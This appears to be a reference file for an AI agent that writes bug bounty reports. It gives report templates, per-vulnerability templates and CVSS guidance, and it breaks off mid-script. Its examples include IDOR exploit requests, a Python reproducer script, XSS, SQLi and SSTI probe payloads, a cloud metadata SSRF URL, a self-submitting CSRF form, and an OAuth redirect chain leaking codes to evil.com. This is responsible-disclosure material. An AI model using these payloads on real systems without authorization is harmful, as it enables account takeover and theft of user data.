# Reporter Agent — Full Reference
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**

**Purpose**: Everything the reporter agent needs to produce a first-try-reproducible,
triager-ready vulnerability report. The stub (`agents/reporter-agent.md`) covers the
pre-submission gate, 7 mandatory sections, and CVSS basics. This file covers the rest.

---

## Table of Contents

1. [Complete Report Template](#1-complete-report-template)
2. [Vulnerability-Class-Specific Templates](#2-vulnerability-class-specific-templates)
3. [CVSS Scoring Reference Table](#3-cvss-scoring-reference-table)
4. [Title Format Guide](#4-title-format-guide)
5. [Evidence Section Format](#5-evidence-section-format)
6. [Before/After Diff Format](#6-beforeafter-diff-format)
7. [reproduce.py Template](#7-reproducepy-template)
8. [Common Triager Rejection Patterns](#8-common-triager-rejection-patterns)
9. [Platform-Specific Notes](#9-platform-specific-notes)
10. [Severity Calibration](#10-severity-calibration)

---

## 1. Complete Report Template

Copy this entire block and fill every placeholder. Comments in `<!-- ... -->` explain
the intent — remove them from the final submission.

```markdown
# [VulnType] in [Location] allows [Impact]
<!-- Title: max 80 chars, pattern: VulnType + Location + Impact. See Section 4. -->

## Summary

<!-- 3-5 sentences. Lead with what was found and what an attacker gains. Do NOT lead
     with "I found" or methodology. State the root cause in the final sentence. -->

**[VulnType]** exists at `[endpoint or component]` on `[asset]`. An authenticated
[or unauthenticated] attacker can [concrete action] to gain [concrete outcome —
e.g., "read any user's private messages", "execute arbitrary OS commands"]. No user
interaction is required. The root cause is [one sentence: e.g., "the server uses the
caller-supplied `user_id` parameter without verifying the requesting session owns it"].

## Severity

**[Critical / High / Medium / Low]**

CVSS:3.1/AV:[X]/AC:[X]/PR:[X]/UI:[X]/S:[X]/C:[X]/I:[X]/A:[X]

- AV:[X]  — [reason, e.g., "exploitable over the internet from any location"]
- AC:[X]  — [reason, e.g., "no special race condition or pre-configuration required"]
- PR:[X]  — [reason, e.g., "any registered free-tier account suffices"]
- UI:[X]  — [reason, e.g., "victim takes no action"]
- S:[X]   — [reason, e.g., "impact contained to the vulnerable API component" OR
             "exploit crosses security boundary into internal network"]
- C:[X]   — [reason, e.g., "attacker reads full PII records including SSN and DOB"]
- I:[X]   — [reason, e.g., "attacker can overwrite any user's profile data"]
- A:[X]   — [reason, e.g., "no availability impact demonstrated"]

## Expected vs Actual Behavior

<!-- MANDATORY. Side-by-side comparison. Make the contrast obvious at a glance. -->

| | Expected | Actual |
|---|---|---|
| Request | `GET /api/users/456/profile` with session for user 123 | Same request |
| Response | `403 Forbidden` — access denied to another user's resource | `200 OK` — full profile of user 456 returned |
| Data exposed | None | `{name, email, phone, dob, address, ...}` |

## Prerequisites

<!-- Everything a triager needs BEFORE Step 0. Be explicit. -->

- Two accounts on `[asset]`:
  - **Account A** (attacker): `attacker@example.com` / `Password123!`
  - **Account B** (victim): `victim@example.com` / `Password456!`
- [Any region / plan / feature flag required]
- [Any setup: "Account B must have at least one saved address"]
- cURL or the reproduce.py script below
- [OOB callback platform if blind vuln: "Burp Collaborator or interactsh instance"]

## Step 0: Fresh Auth

<!-- NEVER embed static tokens. Always show how to obtain a live token. -->

**Get Account A token:**
```bash
TOKEN_A=$(curl -s -X POST 'https://[asset]/api/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"Password123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token A: $TOKEN_A"
```

**Get Account B's user ID (to target):**
```bash
VICTIM_ID=$(curl -s 'https://[asset]/api/users/me' \
  -H "Authorization: Bearer $TOKEN_B" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Victim ID: $VICTIM_ID"
```

## Step 1: Establish Baseline (Normal Behavior)

<!-- Show that the SAME request type, with CORRECT parameters, behaves normally.
     This proves the exploit is not caused by a misconfigured test environment. -->

Access Account A's own data — expect 200 OK:
```bash
OWN_ID="[Account A's user ID]"
curl -s -X GET "https://[asset]/api/users/$OWN_ID/profile" \
  -H "Authorization: Bearer $TOKEN_A"
```

**Expected output** (normal — 200 with own data):
```json
{
  "id": "[own ID]",
  "name": "Attacker Account",
  "email": "attacker@example.com"
}
```

Access a non-existent resource — expect 404:
```bash
curl -s -X GET "https://[asset]/api/users/00000000/profile" \
  -H "Authorization: Bearer $TOKEN_A"
```

**Expected output** (normal — 404):
```json
{"error": "not found"}
```

## Step 2: Exploit

<!-- The payload. Every flag must be copy-paste exact. Highlight what changed. -->

Using Account A's token, request Account B's private profile by substituting their ID:

```bash
curl -s -X GET "https://[asset]/api/users/$VICTIM_ID/profile" \
  -H "Authorization: Bearer $TOKEN_A"
```

**Actual output** (VULNERABLE — Account B's data returned to Account A):
```json
{
  "id": "[victim ID]",
  "name": "Victim User",
  "email": "victim@example.com",
  "phone": "+1-555-0100",
  "date_of_birth": "1985-03-14",
  "address": "123 Main St, Springfield"
}
```

<!-- If any field in the response is ambiguous ("success":false but data still returned),
     explain it here immediately — do not leave it for the triager to figure out. -->

## Before/After Diff

```
NORMAL REQUEST (own resource)           EXPLOIT REQUEST (victim's resource)
─────────────────────────────────────   ─────────────────────────────────────
GET /api/users/[own-id]/profile         GET /api/users/[victim-id]/profile
Authorization: Bearer $TOKEN_A          Authorization: Bearer $TOKEN_A
                                                                ↑ same token, different ID

HTTP/1.1 200 OK                         HTTP/1.1 200 OK  ← should be 403
{                                       {
  "id": "[own-id]",                       "id": "[victim-id]",
  "name": "Attacker Account",             "name": "Victim User",
  "email": "attacker@example.com"         "email": "victim@example.com",
                                          "phone": "+1-555-0100",   ← private PII
                                          "date_of_birth": "1985-03-14"
}                                       }
```

## Evidence

<!-- Screenshots, GIFs, curl outputs, OOB logs. See Section 5 for format. -->

**Screenshot — Burp Suite showing exploit request and 200 response:**
![Burp Suite — IDOR exploit](../../../findings/[target]/evidence/[slug]-burp.png)

**Screen recording — full attack flow:**
![Attack flow GIF](../../../findings/[target]/evidence/[slug]-flow.gif)

**Raw curl output saved to file:**
```
findings/[target]/evidence/[slug]-curl-output.txt
```

## reproduce.py

<!-- Self-contained script. Must print VULNERABLE or NOT VULNERABLE. See Section 7. -->

```python
# [paste full reproduce.py here — see Section 7 for template]
```

## Impact

<!-- Business-focused. Answer: who is harmed, how many, what data, what compliance
     consequence. Avoid pure-technical language ("the ORM does not parameterize").
     Quantify where possible. -->

Any of the [X] registered users on [asset] can have their full PII profile read by any
other authenticated user. The exposed fields — email, phone number, date of birth, and
physical address — constitute personal data under GDPR Article 4(1) and Australia's
Privacy Act 1988. Exfiltrating all user records requires only iterating user IDs and
collecting 200 responses.

**Affected users**: All registered accounts (approximately [N] based on [evidence, e.g.,
highest observed user ID]).

**Attack scenario**: A malicious user registers a free account, iterates user IDs from 1
to N, and downloads the full PII dataset. This data can be used for identity theft,
phishing, or sold on criminal markets. The program would face mandatory breach
notification obligations (GDPR Art. 33, OAIC) for the resulting data exposure.

## Suggested Remediation

<!-- Keep this brief and accurate. Do not over-architect a fix. -->

Enforce ownership check server-side before returning profile data:
```python
if requested_user_id != session.user_id:
    return 403
```

Do not rely on the client to send only its own ID.

## References

<!-- Optional. Only include if directly relevant. -->

- OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key
```

---

## 2. Vulnerability-Class-Specific Templates

### 2.1 IDOR / BOLA

**Title pattern**: `IDOR on [endpoint] exposes [data type] of any user`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Response to cross-user request | `403 Forbidden` | `200 OK` with victim's data |
| Scope of data | Own data only | Any user's `{field list}` |

**Proof required**:
- Two distinct accounts (different UIDs)
- Response showing victim account's unique data (email, name, or any field that differs)
- Baseline 200 for own resource proving the endpoint works normally
- Ideally: screenshot showing both accounts' data side by side

**Key mistakes to avoid**:
- Showing only the 200 response — also show the 403 you get when not logged in (proves
  the endpoint has SOME auth, just broken object-level auth)
- Guessing at the victim's UID — use a real second account you control

---

### 2.2 XSS — Reflected

**Title pattern**: `Reflected XSS in [parameter] on [endpoint] via [entry point]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Input `<script>alert(1)</script>` in `q=` | Rendered as escaped text or stripped | Script executes in victim's browser |
| CSP | N/A or blocks inline scripts | Absent or bypassable |

**Proof required**:
- Screenshot or GIF of `alert()` / `confirm()` / `prompt()` firing
- The full URL or POST body that triggers it — triager must be able to click a link
- Victim must be able to reach the URL without logging in (or note auth requirement)
- For POST-based reflected XSS: a self-submitting HTML form that auto-fires the payload

**Key differences by type**:
- Reflected: URL/form parameter, single victim interaction (click link)
- Stored: Requires storing step + viewing step — two separate curl/browser steps
- DOM: No server round-trip — use browser dev tools to confirm payload executes
  client-side; note source (e.g., `location.hash`, `document.referrer`) and sink
  (e.g., `innerHTML`, `eval`)

---

### 2.3 XSS — Stored

**Title pattern**: `Stored XSS in [field] on [page] allows session hijacking of any viewer`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Stored payload in bio field | Rendered as text: `<script>...` | Script executes for every visitor |
| Storage response | Payload sanitized or rejected | `200 OK`, payload stored verbatim |
| View response | Payload escaped in HTML | `<script>` tag present in DOM, executed |

**Proof required** (two-phase):
1. Curl/request showing payload was accepted and stored (200 response with payload echoed back or retrievable)
2. Screenshot/GIF of a different session loading the page and the alert firing

---

### 2.4 XSS — DOM

**Title pattern**: `DOM XSS via [source] into [sink] on [page] — no server interaction required`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| `location.hash` value reflected into innerHTML | Escaped or not reflected | Unescaped, script executes |

**Proof required**:
- Browser console screenshot showing script execution
- Browser DevTools Sources view showing the vulnerable code path (source → sink)
- The exact URL with the payload in the hash/query

---

### 2.5 SSRF — Non-Blind

**Title pattern**: `SSRF via [parameter] on [endpoint] allows reading internal [resource]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| `url=http://169.254.169.254/latest/meta-data/` | Blocked or 400 error | Cloud metadata content returned in response body |

**Proof required**:
- Response body containing internal resource content (metadata, internal HTTP response)
- If AWS: show `iam/security-credentials/` response with actual key material (redact after
  confirming role exists — show the role name, redact the actual secret)
- Before/after showing that a non-routable internal IP returns different content from a
  public IP (proves the server is making the request)

---

### 2.6 SSRF — Blind / OOB

**Title pattern**: `Blind SSRF via [parameter] on [endpoint] confirmed via OOB DNS callback`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Request to attacker-controlled domain | Blocked | DNS resolution and HTTP request received at OOB listener |

**Proof required** (OOB callback is mandatory — without it this is theoretical):
- OOB platform log screenshot (Burp Collaborator, interactsh, webhook.site) showing DNS
  and/or HTTP interaction with timestamp
- The timestamp must be within seconds of the exploit request
- Include: the interaction type (DNS vs HTTP), the payload URL used, source IP of callback
- Timing correlation table:

```
Exploit sent:     2026-03-22T14:23:01Z
OOB DNS received: 2026-03-22T14:23:01.842Z  ← within 1 second = confirmed server-side
OOB HTTP received:2026-03-22T14:23:02.011Z
Callback IP:      10.42.0.5  ← internal IP range = server-side, not CDN
```

---

### 2.7 SQL Injection

**Title pattern**: `SQL injection in [parameter] on [endpoint] allows [impact: e.g., full database read]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| `id=1'` | 400 Bad Request or sanitized | `500 Internal Server Error` with SQL error in body |
| `id=1 AND 1=1` | Same as `id=1` | Same as `id=1` (boolean-based confirmation) |
| `id=1 AND 1=2` | Same as `id=1` | Empty result (confirms boolean-based SQLi) |

**Proof required**:
- Error-based: show the raw SQL error message in the response body
- Boolean-based: show three responses — `id=1`, `id=1 AND 1=1` (same), `id=1 AND 1=2`
  (different), proving condition evaluation
- Time-based: show `SLEEP(5)` adding exactly ~5s latency vs no latency without it
  (include response time headers or timestamps)
- Union-based: show the injected column appearing in the response
- Ideal: if safe to do so, extract the DB version string or table count as proof of
  data read capability

---

### 2.8 Authentication Bypass

**Title pattern**: `Authentication bypass on [endpoint] allows [action] without valid credentials`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Request with no/invalid token | `401 Unauthorized` | `200 OK` with protected resource |
| Forged/modified token | Token rejected | Server accepts and returns data |

**Proof required**:
- Show the exact missing/modified/forged header value
- Show both the rejected state (baseline 401) and the bypassed state (200)
- If JWT: show the decoded original token, the modification made, and the server's acceptance
- If session fixation: show session ID is not rotated after login

---

### 2.9 Business Logic Abuse

**Title pattern**: `[Specific logic flaw] in [feature] allows [concrete abuse, e.g., "purchasing items at negative price"]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Quantity `-1` in cart | Rejected or clamped to 0 | Accepted; credit added to account |
| Coupon applied twice | Second application rejected | Both applied; 40% discount granted |

**Proof required**:
- Show the full request/response sequence (often multi-step)
- Show the before-state (balance/price/quantity before exploit)
- Show the after-state (balance/price/quantity after exploit)
- Screenshot of the UI confirming the state change (account balance, order total)

---

### 2.10 Information Disclosure

**Title pattern**: `[Sensitive data type] exposed via [location] — unauthenticated / to any authenticated user`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Response from `/api/config` | Empty or 404 | Okta client secret, S3 bucket name, API keys |
| JS bundle | No internal references | Internal service URLs, credentials, feature flags |

**Proof required**:
- Quote the exact sensitive strings from the response — redact real secrets in the report
  (show first 8 chars + `...`), but confirm the full value privately if asked
- Show that the data is reachable without elevated privileges
- If credentials: show one step of using them (e.g., authenticate to the exposed service)
  to prove they are live (do not exploit further without authorization)

---

### 2.11 CSRF

**Title pattern**: `CSRF on [endpoint] allows attacker to [action, e.g., "change victim's email"] without interaction beyond clicking a link`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Cross-origin POST without CSRF token | Rejected with 403 | Accepted — state change occurs |
| `Origin: https://evil.com` header | Rejected | Accepted |

**Proof required**:
- Self-submitting HTML PoC that fires automatically when victim visits the attacker's page
- Show the state change on the victim account AFTER submitting the form (screenshot of
  changed email/password/setting)
- Confirm no CSRF token is present in the request OR that the token is not validated
  (try submitting with an invalid/random token)

**HTML PoC template**:
```html
<!-- Host on attacker's server. Victim visits this page. -->
<html>
<body onload="document.forms[0].submit()">
<form method="POST" action="https://[target]/api/account/email">
  <input type="hidden" name="email" value="attacker@evil.com"/>
</form>
</body>
</html>
```

---

### 2.12 Open Redirect — Chain Only (Standalone is N/A)

**Standalone open redirect is almost universally rated Informative / N/A by major programs.
Do not file it alone. Only report as part of a chain.**

**Chain example title**: `Open redirect + OAuth state fixation → account takeover on [asset]`

**Chain structure**:

```
Step 1: Attacker crafts OAuth authorize URL with:
        - redirect_uri=https://[target]/redirect?url=https://evil.com/callback
        - state=[attacker-chosen value]

Step 2: Victim clicks attacker's crafted link, authenticates to OAuth provider

Step 3: Provider redirects to redirect_uri — open redirect fires, victim's
        browser sent to https://evil.com/callback?code=[auth_code]&state=[...]

Step 4: Attacker receives auth_code, exchanges for token at:
        POST /oauth/token with code=[captured code]

Result: Attacker is authenticated as victim
```

**Proof required**: Full end-to-end demonstration, each step documented.

---

### 2.13 Race Condition

**Title pattern**: `Race condition in [feature] allows [duplicate action, e.g., "redeeming a coupon twice"]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Coupon redemption | Applied once; second request rejected | Both concurrent requests succeed; coupon applied twice |

**Proof required**:
- Show the concurrent requests (timing must overlap — use `--parallel` in curl or a
  thread-based reproduce.py)
- Show both 200 responses
- Show the resulting state (account balance, usage counter) confirming double-application
- Include timestamps of both requests and both responses

**Timing table**:
```
Request 1 sent:     14:23:01.000
Request 2 sent:     14:23:01.003   ← within same millisecond window
Request 1 response: 14:23:01.412  {"success": true, "coupon": "APPLIED"}
Request 2 response: 14:23:01.418  {"success": true, "coupon": "APPLIED"}  ← BOTH accepted
Final balance:      $40 credit (expected: $20)
```

---

### 2.14 SSTI

**Title pattern**: `SSTI in [field] via [template engine] allows [impact: RCE / file read]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| Input `{{7*7}}` | Rendered as literal `{{7*7}}` | Response contains `49` |
| Input `${7*7}` | Rendered as literal `${7*7}` | Response contains `49` |

**Proof required**:
- Math expression (`{{7*7}}` → `49`) proving template evaluation
- Engine fingerprint (Jinja2, Twig, Freemarker, Pebble, etc.) via canary payloads
- If RCE achievable: show safe command output e.g. `id` (Linux) or `whoami` (Windows)
- If file read achievable: show `/etc/hostname` or equivalent (never read sensitive files
  beyond what's needed to prove the capability)

---

### 2.15 Subdomain / Resource Takeover

**Title pattern**: `Subdomain takeover on [subdomain] via dangling [CNAME target / S3 / GitHub Pages]`

**Expected vs Actual**:

| | Expected | Actual |
|---|---|---|
| `[subdomain].[target].com` | Serves legitimate content | CNAME points to unclaimed resource; returns provider's "not found" page |
| After claiming resource | N/A | Attacker controls content served on target's subdomain |

**Proof required**:
- `dig CNAME [subdomain]` output showing the dangling CNAME
- HTTP response from the subdomain showing the provider's unclaimed message
  (e.g., "There isn't a GitHub Pages site here", "NoSuchBucket", "Fastly error unknown domain")
- **Do NOT actually claim the resource** without explicit program permission — show the
  DNS record and provider response as proof; programs accept this
- If program explicitly allows claiming as proof: take over, host a benign page with the
  report number, then immediately remove it and document the window

---

## 3. CVSS Scoring Reference Table

Use this table to calibrate your initial vector string. Always adjust for actual observed conditions.

| Vulnerability Class | Typical CVSS Vector | Score | Key Reasoning |
|---|---|---|---|
| Unauthenticated IDOR (read PII) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | 7.5 High | No auth, no complexity, high PII read. No write demonstrated. |
| Authenticated IDOR (read) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` | 6.5 Medium | Requires valid (free) account. |
| Authenticated IDOR (read+write) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | 8.1 High | Write demonstrated (modify victim record). |
| Stored XSS (auth required to store) | `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` | 5.4 Medium | PR:L because storing requires account; UI:R because victim must view; S:C because script runs in victim's browser security context. |
| Stored XSS (unauthenticated store) | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | 6.1 Medium | PR:N because anyone can submit the form. |
| Reflected XSS | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | 6.1 Medium | UI:R because victim must click link. |
| SSRF → internal metadata | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` | 7.7 High | S:C because exploit crosses to cloud infrastructure (out of component scope). |
| SSRF → internal metadata + creds | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` | 9.1 Critical | I:H if retrieved credentials allow write to cloud resources. |
| Blind SSRF (DNS only) | `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` | 5.0 Medium | C:L for limited info leak (confirms internal network exists). |
| SQL injection (error/blind, read) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` | 6.5 Medium | Database read confirmed; no write. |
| SQL injection (full read+write) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | 8.1 High | Full DB read and write demonstrated. |
| SQLi unauthenticated | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` | 9.1 Critical | No auth required. |
| Authentication bypass | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` | 9.1 Critical | Full session access without credentials. |
| CSRF (sensitive action) | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | 6.5 Medium | UI:R (victim clicks link); I:H if action is email/password change. |
| SSTI → RCE | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | 9.9 Critical | S:C: template runs on server, escapes app sandbox. Full CIA. |
| Race condition (double spend) | `AV:N/AC:H/UI:N/PR:L/S:U/C:N/I:H/A:N` | 6.3 Medium | AC:H for timing requirement. I:H for financial manipulation. |
| Subdomain takeover | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | 6.1 Medium | Attacker serves content on trusted domain; victim must visit. |
| Information disclosure (keys/secrets) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | 7.5 High | No auth, high confidence data accessible. |
| Information disclosure (internal URLs) | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` | 5.3 Medium | C:L for partial info; not full data read. |

### When to Use S:Changed vs S:Unchanged

Use **S:C (Scope:Changed)** when the exploit crosses a security boundary — the impacted
component is different from the vulnerable component:

- SSRF reaching cloud metadata service (app → cloud infrastructure)
- XSS executing in a victim's browser (server → victim's browser security context)
- SSTI achieving RCE on the host OS (app → OS)
- Subdomain takeover (attacker's infrastructure → trusted origin)

Use **S:U (Scope:Unchanged)** when:
- IDOR reading data within the same application
- SQLi querying the application's own database (no lateral movement)
- Business logic abuse within the same account/session

---

## 4. Title Format Guide

### Pattern

```
[VulnType] in [Location] allows/leads to [Impact]
```

- **VulnType**: specific, not generic. "Stored XSS" not "XSS". "IDOR" not "Access Control".
- **Location**: endpoint path, parameter name, or feature name. Not "the website".
- **Impact**: concrete outcome for an attacker. Not "unauthorized access" — say what
  the attacker actually gains or does.

### Good vs Bad Examples

| Bad | Good | Why |
|---|---|---|
| `XSS found` | `Stored XSS in profile bio field allows session hijacking of any viewer` | Specific vuln type, location, and impact |
| `IDOR vulnerability` | `IDOR on GET /api/orders/{id} exposes full order history of any user` | Endpoint named, data type named |
| `SQL injection` | `Boolean-based SQLi in search parameter allows full database read` | Technique named, impact quantified |
| `Sensitive data exposed` | `AWS IAM credentials exposed in unauthenticated JS bundle` | What credentials, where, access level |
| `SSRF vulnerability in image upload` | `SSRF via image URL parameter fetches AWS metadata (role: prod-ec2)` | What was reached, with proof embedded in title |
| `Authentication bypass` | `JWT algorithm confusion (RS256→HS256) allows forging any user's session` | Root cause in title, no ambiguity |
| `Business logic issue` | `Negative quantity in cart converts item cost to account credit` | Concrete mechanic and outcome |
| `Race condition` | `Race condition on coupon redemption allows applying the same code twice` | Feature named, double-application confirmed |
| `Information disclosure` | `Okta client_secret and redirect URIs exposed in unauthenticated Apex response` | Specific data type, specific endpoint type |
| `RCE` | `SSTI via Jinja2 in report name field achieves OS command execution` | Engine named, field named, impact confirmed |

### Chain Title Pattern

```
[VulnA] + [VulnB] → [Combined Impact higher than either alone]
```

Examples:
- `Open redirect + OAuth state bypass → Account takeover via code theft`
- `SSRF + Metadata credentials → Full AWS account compromise`
- `IDOR + PII read → GDPR-reportable mass data exfiltration (N users)`

### Length

Keep titles under 80 characters. If you cannot fit all three elements, prioritise:
1. VulnType (non-negotiable)
2. Impact (non-negotiable)
3. Location (can be abbreviated)

---

## 5. Evidence Section Format

### Screenshot Paths

Reference evidence using paths relative to the report file, or absolute paths from the
findings directory. Be consistent within one report.

```markdown
**Figure 1 — Burp Suite: exploit request and 200 response**
![Burp Suite exploit request](../../../findings/[target]/evidence/[slug]-burp-request.png)

**Figure 2 — Victim account dashboard showing attacker's modification**
![Victim dashboard after CSRF](../../../findings/[target]/evidence/[slug]-victim-post-csrf.png)
```

Rule: Every screenshot needs a caption that tells the triager exactly what to look for.
Do not embed an unexplained image.

### GIF Paths

```markdown
**Recording — full attack flow from exploit request to session hijack:**
![Attack flow](../../../findings/[target]/evidence/[slug]-flow.gif)
<!-- GIF should be <30s and <5MB. If longer, link to a video file instead. -->
```

### OOB Callback Logs

Paste the raw log from your OOB platform inside a code block with a timestamp column:

```
OOB Interaction Log — interactsh.com — 2026-03-22
─────────────────────────────────────────────────
14:23:01.842Z  DNS  A  [uuid].oast.fun  FROM: 10.42.0.5
14:23:02.011Z  HTTP GET /?x=probe FROM: 10.42.0.5
               User-Agent: python-requests/2.28.0
               X-Forwarded-For: 10.42.0.5
```

Also include a screenshot of the OOB platform UI showing the same interactions.

### Curl Output Format

Save raw curl output to a file during testing:
```bash
curl -sv "https://[target]/[endpoint]" 2>&1 | tee findings/[target]/evidence/[slug]-curl.txt
```

In the report, embed the relevant portion (not the full 500-line response):
```
[Excerpt from findings/[target]/evidence/[slug]-curl.txt — full file attached]

< HTTP/2 200
< content-type: application/json
< x-request-id: a3f2c1d9
<
{
  "id": 456,
  "email": "victim@example.com",
  ...
}
```

### What NOT to Do

- Do not embed base64 images inline — use file paths
- Do not paste a 400-line JSON response — extract the relevant 10 lines
- Do not use screenshots with PII visible — redact email addresses and phone numbers
  visible in UI screenshots (the response body excerpt is enough for proof)
- Do not use screenshots taken days before submission — triager may check EXIF data

---

## 6. Before/After Diff Format

Use a two-column text block with a clear separator. This goes immediately after the
exploit step, before the evidence section.

### Template

```
BEFORE (normal — authorized request)    AFTER (exploit — unauthorized request)
────────────────────────────────────    ────────────────────────────────────

[Request line]                          [Modified request line]
[Header that is the same]               [Header that is the same]
[Header or body that changed]  ←───── only this value changed

[Response status]                       [Response status — different]
[Response body excerpt — normal]        [Response body excerpt — shows the vuln]
```

### Concrete Example — IDOR

```
BEFORE: Own resource (authorized)       AFTER: Victim's resource (IDOR)
──────────────────────────────────      ──────────────────────────────────
GET /api/v1/users/1001/orders           GET /api/v1/users/1002/orders
Authorization: Bearer $TOKEN_A          Authorization: Bearer $TOKEN_A
                                                                ↑ same token

HTTP/1.1 200 OK                         HTTP/1.1 200 OK  ← should be 403
{                                       {
  "user_id": 1001,                        "user_id": 1002,  ← different user
  "orders": [                             "orders": [
    {"id": 9001, "total": "$45.00"}         {"id": 8850, "total": "$310.00"}
  ]                                       ]
}                                       }
```

### Concrete Example — Auth Bypass

```
BEFORE: No token (normal rejection)    AFTER: Modified token (bypass)
───────────────────────────────────    ───────────────────────────────────
GET /api/admin/users                   GET /api/admin/users
Authorization: Bearer [invalid]        Authorization: Bearer [modified JWT]
                                                          ↑ alg changed to none

HTTP/1.1 401 Unauthorized              HTTP/1.1 200 OK  ← BYPASSED
{"error": "invalid token"}             [{"id":1,"email":"admin@..."},...]
```

---

## 7. reproduce.py Template

### Template A — Authenticated Server-Side Vulnerability

```python
#!/usr/bin/env python3
"""
Reproduce: [VulnType] in [Location]
Target:    [asset domain]
Program:   [HackerOne / Bugcrowd / Intigriti program name]
Slug:      [your internal finding slug, e.g., exness-H009]
Severity:  [Critical / High / Medium / Low]

Usage:
    python3 reproduce.py

    The script will prompt for credentials if not set via environment variables.
    Set ATTACKER_EMAIL, ATTACKER_PASS, VICTIM_ID to skip prompts.
"""

import os
import sys
import json
import time
import urllib.request
import urllib.parse
import urllib.error
from typing import Optional

BASE_URL = "https://[target-domain]"

# --- Configuration -----------------------------------------------------------

ATTACKER_EMAIL: str = os.environ.get("ATTACKER_EMAIL", "") or input("Attacker email: ")
ATTACKER_PASS: str  = os.environ.get("ATTACKER_PASS", "")  or input("Attacker password: ")
VICTIM_ID: str      = os.environ.get("VICTIM_ID", "")       or input("Victim user ID: ")

# --- Helpers -----------------------------------------------------------------

def request(
    method: str,
    path: str,
    headers: Optional[dict] = None,
    body: Optional[dict] = None,
) -> tuple[int, dict]:
    """Send an HTTP request and return (status_code, parsed_json_or_empty_dict)."""
    url = BASE_URL + path
    data = json.dumps(body).encode() if body else None
    hdrs = {"Content-Type": "application/json", **(headers or {})}
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def get_token(email: str, password: str) -> str:
    """Authenticate and return a Bearer token."""
    status, body = request("POST", "/api/auth/login", body={
        "email": email,
        "password": password,
    })
    if status != 200 or "token" not in body:
        print(f"[FAIL] Login failed: {status} {body}")
        sys.exit(1)
    return body["token"]


# --- Step 0: Auth ------------------------------------------------------------

print("[*] Step 0: Authenticating as attacker...")
token_a = get_token(ATTACKER_EMAIL, ATTACKER_PASS)
print(f"[+] Token obtained: {token_a[:20]}...")

# --- Step 1: Baseline (own resource) ----------------------------------------

print("\n[*] Step 1: Baseline — accessing own resource...")
status_own, body_own = request(
    "GET",
    "/api/users/me",   # adjust to the baseline endpoint
    headers={"Authorization": f"Bearer {token_a}"},
)
own_id = body_own.get("id", "UNKNOWN")
print(f"    Own user ID: {own_id}")
print(f"    Status: {status_own} (expect 200)")

# --- Step 2: Exploit ---------------------------------------------------------

print(f"\n[*] Step 2: Exploit — requesting victim ID {VICTIM_ID} with attacker token...")
status_vuln, body_vuln = request(
    "GET",
    f"/api/users/{VICTIM_ID}/profile",  # adjust to vulnerable endpoint
    headers={"Authorization": f"Bearer {token_a}"},
)

# --- Verdict -----------------------------------------------------------------

print(f"\n    Response status: {status_vuln}")
print(f"    Response body:   {json.dumps(body_vuln, indent=2)[:500]}")

# Adjust the condition to match the actual vulnerability indicator
if status_vuln == 200 and body_vuln.get("id") == VICTIM_ID:
    print("\n[!!!] VULNERABLE")
    print(f"      Attacker (user {own_id}) read victim (user {VICTIM_ID}) profile.")
    print(f"      Exposed data: {list(body_vuln.keys())}")
    sys.exit(0)
elif status_vuln == 403:
    print("\n[OK]  NOT VULNERABLE — server returned 403 Forbidden")
    sys.exit(1)
else:
    print(f"\n[?]   INCONCLUSIVE — status {status_vuln}, review response above")
    sys.exit(2)
```

### Template B — Unauthenticated Vulnerability

```python
#!/usr/bin/env python3
"""
Reproduce: [VulnType] — unauthenticated
Target:    [asset domain]
"""

import sys
import json
import urllib.request
import urllib.error

BASE_URL = "https://[target-domain]"
ENDPOINT = "/api/[vulnerable-path]"
PAYLOAD  = {"key": "value"}  # adjust

def check() -> None:
    url = BASE_URL + ENDPOINT
    data = json.dumps(PAYLOAD).encode()
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            status = resp.status
            body = json.loads(resp.read())
